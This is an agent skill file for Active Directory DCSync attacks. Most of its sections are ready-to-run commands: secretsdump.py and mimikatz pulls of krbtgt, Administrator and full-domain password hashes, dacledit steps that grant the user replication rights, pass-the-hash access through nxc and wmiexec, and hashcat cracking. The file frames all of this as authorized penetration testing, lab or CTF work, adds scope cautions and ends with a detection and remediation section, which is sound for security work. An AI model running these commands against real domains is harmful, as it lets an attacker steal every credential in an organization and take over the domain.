---
name: dcsync
description: Use when pulling Active Directory credential material through
  directory replication on an authorized engagement. Covers confirming
  replication rights, targeted DCSync of the krbtgt and Administrator
  accounts with secretsdump.py from impacket 0.12.0 and mimikatz 2.2.0
  lsadump::dcsync, disciplined full domain pulls, granting yourself
  replication rights with dacledit when you hold WriteDACL, and turning
  recovered hashes into pass the hash access. Use when you hold Domain
  Admin equivalent rights and need hashes for lateral movement or ticket
  forging, or when a CTF or lab requires offline credential extraction.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [ad-enumeration, password-attacks]
tools:
  - name: impacket
    version: 0.12.0
  - name: mimikatz
    version: 2.2.0
  - name: NetExec
    version: 1.4.0
  - name: Python
    version: "3.12"
---

DCSync makes a domain controller hand over password hashes over the
normal replication protocol (DRSUAPI), the same way a second domain
controller would ask for them. Any account with the three replication
rights (Replicating Directory Changes, Replicating Directory Changes All,
and Replicating Directory Changes in Filtered Set) can pull the NTLM hash
of any account in the domain, including krbtgt and Domain Admins. This
skill covers the full authorized workflow for Active Directory
assessments, lab environments, and CTFs only: confirming you have the
rights, pulling targeted accounts, doing disciplined full dumps, granting
the rights to yourself when you hold the right ACLs, and using the
recovered hashes.

## Quick Workflow

1. Confirm your account holds the replication rights on the domain
   object before you attempt anything.
2. Start targeted: pull only the accounts the test plan needs (krbtgt,
   Administrator, or a specific service account).
3. Save every pull to an output file so the evidence is reproducible.
4. Only run a full domain pull when the scope explicitly allows it, and
   treat the output as the most sensitive file on your disk.
5. Turn recovered NTLM hashes into access with pass the hash, without
   cracking first.
6. Crack selectively offline when the report needs password strength
   findings.
7. If you lack the rights, earn them through an ACL edge (dacledit) or a
   BloodHound path, then retry.
8. Record every account pulled, the method, and where the output is
   stored.

## 1. Confirm replication rights

DCSync fails cleanly without the rights, so check first and save yourself
a noisy failed attempt.

```bash
# Inspect the DACL of the domain object for replication rights
nxc ldap 10.10.10.10 -u eviluser -p 'Password1' \
  -M daclread -o TARGET_DN='DC=corp,DC=local'
```

Look for your account's SID with rights mentioning replication or
extended rights with the replication GUIDs. In BloodHound, the same check
is visual: find your user, look for GetChanges and GetChangesAll edges to
the domain object. The raw Cypher is:

```cypher
// Who can replicate (DCSync) the domain
MATCH (n)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN n.name
```

PowerView on Windows shows the same DACL:

```powershell
# Check for replication extended rights on the domain object
Get-ObjectAcl -Identity "DC=corp,DC=local" | Where-Object {
  $_.ActiveDirectoryRights -match "ExtendedRight"
} | Select-Object SecurityIdentifier, ActiveDirectoryRights
```

## 2. Targeted DCSync pulls

Pull one account at a time. Targeted pulls are quiet, fast, and easy to
justify in the report.

```bash
# Pull only the krbtgt account (feeds the golden-ticket skill)
secretsdump.py 'corp.local/eviluser:Password1@10.10.10.10' \
  -just-dc-user krbtgt -outputfile loot/krbtgt

# Pull only the built in Administrator
secretsdump.py 'corp.local/eviluser:Password1@10.10.10.10' \
  -just-dc-user administrator -outputfile loot/administrator

# Pull a service account by sAMAccountName
secretsdump.py 'corp.local/eviluser:Password1@10.10.10.10' \
  -just-dc-user svc_backup -outputfile loot/svc_backup
```

Mimikatz does the same from a Windows host with Domain Admin rights:

```text
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:administrator
```

The output line format is `domain\uid:rid:lmhash:nthash`, and the NTLM
hash is the value after the third colon. That hash alone is enough for
pass the hash, no cracking required.

## 3. Full domain pulls (scope permitting)

A full pull dumps every hash in the domain. Only do this when the rules
of engagement allow it, and handle the file like a live credential vault.

```bash
# Full pull against one DC, saved to files
secretsdump.py 'corp.local/eviluser:Password1@10.10.10.10' \
  -outputfile loot/full-dc01

# Pull from a specific DC when several exist
secretsdump.py 'corp.local/eviluser:Password1@dc02.corp.local' \
  -outputfile loot/full-dc02
```

Immediately restrict the output files, since they contain every password
hash in the organization:

```bash
chmod 600 loot/full-dc01.ntds loot/full-dc01.secrets 2>/dev/null
ls -l loot/
```

At the end of the engagement, securely delete these files and confirm
with the client that no copies remain on test systems.

## 4. Grant yourself replication rights

If you hold WriteDACL or GenericAll on the domain object (a common
BloodHound edge), you can grant yourself the replication rights with
impacket's dacledit instead of finding another path to Domain Admin.

```bash
# Grant the three replication rights (the DCSync shortcut) to your user
dacledit.py -action write -rights DCSync -principal eviluser \
  -target-dn "DC=corp,DC=local" "corp.local/eviluser:Password1@10.10.10.10"

# Verify the grant took effect
nxc ldap 10.10.10.10 -u eviluser -p 'Password1' \
  -M daclread -o TARGET_DN='DC=corp,DC=local' | grep -i -A2 eviluser
```

This changes the domain DACL, which is a loud and persistent change.
Only do it when the test plan allows privilege escalation through ACL
abuse, and record the exact change so the client can revert it. Reverting
after the test is good practice:

```bash
# Remove the rights again when the test is done
dacledit.py -action remove -rights DCSync -principal eviluser \
  -target-dn "DC=corp,DC=local" "corp.local/eviluser:Password1@10.10.10.10"
```

## 5. Use the recovered hashes

NTLM hashes authenticate directly. Cracking is optional and often
unnecessary for the test objectives.

```bash
# Pass the hash over SMB (no password needed)
nxc smb 10.10.10.10 -u administrator -H <ntlm_hash>

# Pass the hash into secretsdump for a second pull
secretsdump.py 'corp.local/administrator@10.10.10.10' \
  -hashes :<ntlm_hash> -just-dc-user krbtgt

# Pass the hash into WinRM style execution
wmiexec.py 'corp.local/administrator@10.10.10.10' -hashes :<ntlm_hash>
```

```bash
# Crack selectively for password strength findings
hashcat -m 1000 loot/administrator.ntds /usr/share/wordlists/rockyou.txt --force
```

Feed the krbtgt hash into the golden-ticket skill when the test calls for
ticket forging. Feed any Domain Admin hash into BloodHound re-collection,
since full rights reveal the complete graph.

## Edge cases

- `secretsdump.py` fails with access denied: you do not have the
  replication rights. Go back to section 1 and confirm, then earn the
  rights through an ACL edge before retrying.
- The target is a read only domain controller (RODC): DCSync against an
  RODC only returns the accounts it is allowed to cache. Target a
  writable DC instead.
- LDAP signing or channel binding breaks the connection: secretsdump
  handles signing automatically in recent impacket versions, but very
  old DCs may need `-use-vss` style local approaches instead.
- The pull hangs halfway: large domains are slow. Use `-just-dc-user`
  for what you need instead of full pulls, and target the closest DC.
- Output shows `aad3b435b51404eeaad3b435b51404ee` as the LM hash: that
  is the empty LM placeholder, normal on modern domains. The NTLM hash
  after it is what matters.
- mimikatz `lsadump::dcsync` returns nothing: run `privilege::debug`
  first, and confirm you are running as a Domain Admin equivalent.
- dacledit grant succeeds but DCSync still fails: replication rights can
  take time to apply, and Deny ACEs override Allow. Re-read the DACL to
  confirm the effective rights.
- Defender for Identity or similar sees the pull in real time on a
  monitored engagement: coordinate timing with the client contact so a
  DCSync alert does not trigger their incident process unexpectedly.

## Escalation

- No replication rights and no WriteDACL: work the BloodHound graph for
  another path to Domain Admin (the bloodhound-methodology skill), since
  DCSync is usually the end of a path, not the start.
- You have a DC backup (ntds.dit + SYSTEM hive): extract hashes offline
  with secretsdump.py in local mode instead of DCSync.
- Replication ports blocked by firewall: DCSync needs RPC to the DC.
  Pivot through a host with DC connectivity (network-pivoting skill)
  rather than fighting the firewall.
- The account you want is protected by AdminSDHolder or is in Protected
  Users: pull the krbtgt hash instead and forge a golden ticket, which
  bypasses per account protections.
- You need persistence beyond the test window: stop. Document the
  DCSync capability as the finding and let the client own remediation.
  Planting persistence is outside authorized test scope.
- Shadow credentials (msDS-KeyCredentialLink) as an alternative: if you
  hold GenericWrite on a computer object, Whisker or pywhisker gives you
  that machine's TGT without touching replication rights at all.

## Detection and defender view

Defenders see DCSync as Event ID 4662 on the domain controller with the
replication GUIDs (DS-Replication-Get-Changes and related) in the access
mask, requested by an account that is not a domain controller. Microsoft
Defender for Identity raises a dedicated DCSync alert on exactly this
pattern. Honeypot admin accounts make detection trivial, because any
replication request touching them is malicious by definition. The durable
fixes are: keep Domain Admin membership minimal, never delegate
replication rights broadly, alert on 4662 with replication GUIDs from
non DC accounts, and after any suspected DCSync, reset the krbtgt account
twice and rotate every credential the pulled hashes could reach. There is
no way to unsee a stolen hash, so rotation is the only real remediation.

## Key references

- MITRE ATT&CK T1003.006 (OS Credential Dumping: DCSync).
- Impacket secretsdump.py documentation:
  https://github.com/fortra/impacket/tree/master/examples
- Impacket dacledit.py documentation:
  https://github.com/fortra/impacket/tree/master/examples
- mimikatz lsadump::dcsync documentation:
  https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
- Microsoft documentation on directory replication rights and the
  krbtgt account.
